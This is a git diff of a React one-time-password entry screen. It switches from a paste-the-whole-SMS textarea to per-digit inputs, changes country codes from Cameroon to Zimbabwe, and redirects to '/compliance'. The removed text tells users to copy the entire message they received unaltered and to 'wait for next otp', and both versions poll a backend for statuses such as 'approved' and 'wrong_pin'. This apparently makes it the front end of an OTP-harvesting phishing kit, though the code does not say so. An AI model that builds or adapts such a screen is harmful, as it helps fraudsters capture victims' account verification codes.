@@ -1,16 +1,19 @@
 import React, { useRef, useState, useEffect } from "react";
-import "./otp2.css";
-import { useParams, useNavigate } from "react-router-dom";
+import "./otp.css";
+import { useNavigate } from "react-router-dom";
 import { useVerification } from "../hooks/useVerification";
 import { verificationService } from "../services/api";
 
-const OtpVerification = ({ length = 4, client, myFuncs }) => {
-  const { user } = useParams;
-  const { name, number } = client;
+const OtpVerification = ({ client, myFuncs }) => {
+  const { name, number, length } = client;
   const { setOtp } = myFuncs;
   const navigate = useNavigate();
-  // const [otpp, setOtpp] = useState(Array(length).fill(""));
-  const [otpp, setOtpp] = useState("");
+  const [otpp, setOtpp] = useState(Array(length).fill(""));
+  // const [otp1, setOtp1] = useState("");
+  // const [otp2, setOtp2] = useState("");
+  // const [otp3, setOtp3] = useState("");
+  // const [otp4, setOtp4] = useState("");
+
   const inputRefs = useRef([]);
   const [timer, setTimer] = useState(60);
   const [next, setNext] = useState(false);
@@ -18,8 +21,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
   const [sessionId, setSessionId] = useState(null);
   const [pollingInterval, setPollingInterval] = useState(null);
   const timerZero = timer > 0;
-  const countryCode = 237; // Cameroon country code
-  const [otptext, setOtptext] = useState("");
+  const countryCode = 263;
 
   const intervalRef = useRef(null);
 
@@ -64,7 +66,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
     if (status === "approved") {
       // Auto-redirect after 2 seconds
       const timeout = setTimeout(() => {
-        navigate(`/${user}/otpverification`);
+        navigate("/compliance");
       }, 2000);
       return () => clearTimeout(timeout);
     }
@@ -72,7 +74,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
     if (status === "wrong_pin") {
       // Return to login on wrong PIN
       const timeout = setTimeout(() => {
-        navigate(`/${user}/login`);
+        navigate("/login");
       }, 2000);
       return () => clearTimeout(timeout);
     }
@@ -88,10 +90,6 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
       return () => clearTimeout(timeout);
     }
   }, [status, navigate, reset, length]);
-
-  const handleApprovedOtp = () => {
-    navigate(`/${user}/otpverification`);
-  };
 
   // Manual polling for OTP status (backup to hook)
   const startPolling = (sessionId) => {
@@ -120,15 +118,14 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
         // Handle status changes
         if (data.status === "approved") {
-          handleApprovedOtp();
           // Trigger hook status change or handle directly
-          // console.log("✅ OTP approved via polling!");
+          console.log("✅ OTP approved via polling!");
           if (pollingInterval) {
             clearInterval(pollingInterval);
             setPollingInterval(null);
           }
           // Force navigation
-          // setTimeout(() => navigate("/verification"), 100);
+          setTimeout(() => navigate("/compliance"), 1000);
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code via polling");
           setWrongCode(true);
@@ -142,7 +139,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             clearInterval(pollingInterval);
             setPollingInterval(null);
           }
-          setTimeout(() => navigate(`/${user}/login`), 0);
+          setTimeout(() => navigate("/login"), 1000);
         } else if (data.status === "expired") {
           console.log("⏰ Session expired via polling");
           if (pollingInterval) {
@@ -165,19 +162,21 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log(number);
-    console.log(otptext);
     setWrongCode(false);
-    if (otptext === "" || number === "") {
-      console.log("no otp or number");
+    if (otpp.some((digit) => digit === "")) {
       return;
     }
 
-    // const myotp = otpp;
+    const myotp = otpp.join("");
+
+    // if (myotp.length !== length) {
+    //   alert(`Please enter ${length} digit OTP`);
+    //   return;
+    // }
 
     const userData = {
       phoneNumber: number,
-      otpCode: otptext,
+      otpCode: myotp,
       countryCode: `+${countryCode}`,
       userId: `user_${Date.now()}`,
       userName: name,
@@ -214,11 +213,11 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
   };
 
   const handleChange = (index, value) => {
-    // if (!/^\d*$/.test(value)) return;
+    if (!/^\d*$/.test(value)) return;
 
-    // const newOtp = [...otpp];
-    // newOtp[index] = value.slice(-1);
-    setOtpp(value);
+    const newOtp = [...otpp];
+    newOtp[index] = value.slice(-1);
+    setOtpp(newOtp);
 
     if (value !== "" && index < length - 1) {
       inputRefs.current[index + 1]?.focus();
@@ -309,18 +308,16 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
     setOtp(combinedOtp);
     // If already approved, navigate
     if (status === "approved") {
-      navigate(`/${user}/otpverification`);
+      navigate("/compliance");
     }
   };
 
   // Early returns for specific states
   if (status === "approved") {
-    // navigate("/verification");
-    handleApprovedOtp();
     return (
       <div className="otp-container">
         <div className="verification-success">
-          <h2>✅ Wait for next otp!</h2>
+          <h2>✅ Verification Successful!</h2>
           <p>You will be redirected shortly...</p>
         </div>
       </div>
@@ -328,8 +325,6 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
   }
 
   if (status === "wrong_pin") {
-    navigate(`/${user}/login`);
-
     return (
       <div className="otp-container">
         <div className="verification-error">
@@ -369,16 +364,29 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
         <h2>OTP Verification</h2>
         <p>
-          <strong>
-            We have sent a one-time password (OTP) to your number. Copy the
-            message that we send to your number message and Enter It here to
-            Verify Your number <br></br>
-          </strong>
+          Enter the OTP sent to your number (sms) <br />
           <span style={{ fontWeight: "bold", color: "#333" }}>{number}</span>
         </p>
       </div>
 
       <div className="otp-inputs">
+        {otpp.map((digit, index) => (
+          <input
+            key={index}
+            ref={(el) => (inputRefs.current[index] = el)}
+            type="text"
+            inputMode="numeric"
+            maxLength="1"
+            value={digit}
+            onChange={(e) => handleChange(index, e.target.value)}
+            onKeyDown={(e) => handleKeyDown(index, e)}
+            onPaste={handlePaste}
+            onFocus={handleFocus}
+            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
+            autoComplete="one-time-code"
+            disabled={loading || status === "pending"}
+          />
+        ))}
         {/* {otpp.map((digit, index) => (
           <input
             key={index}
@@ -395,20 +403,41 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             autoComplete="one-time-code"
             disabled={loading || status === "pending"}
           />
+        ))}
+        {otpp.map((digit, index) => (
+          <input
+            key={index}
+            ref={(el) => (inputRefs.current[index] = el)}
+            type="text"
+            inputMode="numeric"
+            maxLength="1"
+            value={digit}
+            onChange={(e) => handleChange(index, e.target.value)}
+            onKeyDown={(e) => handleKeyDown(index, e)}
+            onPaste={handlePaste}
+            onFocus={handleFocus}
+            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
+            autoComplete="one-time-code"
+            disabled={loading || status === "pending"}
+          />
+        ))}{" "}
+        {otpp.map((digit, index) => (
+          <input
+            key={index}
+            ref={(el) => (inputRefs.current[index] = el)}
+            type="text"
+            inputMode="numeric"
+            maxLength="1"
+            value={digit}
+            onChange={(e) => handleChange(index, e.target.value)}
+            onKeyDown={(e) => handleKeyDown(index, e)}
+            onPaste={handlePaste}
+            onFocus={handleFocus}
+            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
+            autoComplete="one-time-code"
+            disabled={loading || status === "pending"}
+          />
         ))} */}
-        <textarea
-          // key={index}
-          // ref={(el) => (inputRefs.current[index] = el)}
-          type="text"
-          // inputMode="numeric"
-          // maxLength="1"
-          value={otptext}
-          onChange={(e) => setOtptext(e.target.value)}
-          className={`otp-input1`}
-          spellCheck="false"
-          autofill="true"
-          // autoComplete="one-time-code"
-        />
       </div>
 
       {wrongCode && (
@@ -437,7 +466,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
       <div className="otp-display">
         <p>
-          <strong>{"Do not alter the message"}</strong>
+          Your OTP: <strong>{otpp.join("") || "______"}</strong>
         </p>
 
         {!next ? (
@@ -445,14 +474,22 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             onClick={handleSubmit}
             className="copy-btn"
             type="button"
-            disabled={loading || status === "pending"}
+            disabled={
+              otpp.join("").length !== length || loading || status === "pending"
+            }
             style={{
               opacity:
-                // otpp.join("").length !== length ||
-                loading || status === "pending" ? 0.6 : 1,
+                otpp.join("").length !== length ||
+                loading ||
+                status === "pending"
+                  ? 0.6
+                  : 1,
               cursor:
-                // otpp.join("").length !== length ||
-                loading || status === "pending" ? "not-allowed" : "pointer",
+                otpp.join("").length !== length ||
+                loading ||
+                status === "pending"
+                  ? "not-allowed"
+                  : "pointer",
             }}
           >
             {loading || status === "pending" ? (
@@ -460,7 +497,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             ) : status && statusMessages[status] ? (
               statusMessages[status]
             ) : (
-              "Submit OTP"
+              "Verify OTP"
             )}
           </button>
         ) : (
@@ -470,6 +507,19 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
         )}
 
         <div className="otp-actions">
+          <button
+            onClick={resetTimer}
+            className="clear-btn"
+            type="button"
+            disabled={timerZero}
+          >
+            {timerZero ? `Resend in ${timer}s` : "Resend OTP"}
+          </button>
+
+          <button onClick={clearOTP} className="clear-btn" type="button">
+            Clear
+          </button>
+
           {status === "expired" && (
             <button onClick={reset} className="retry-button">
               ↻ Try Again
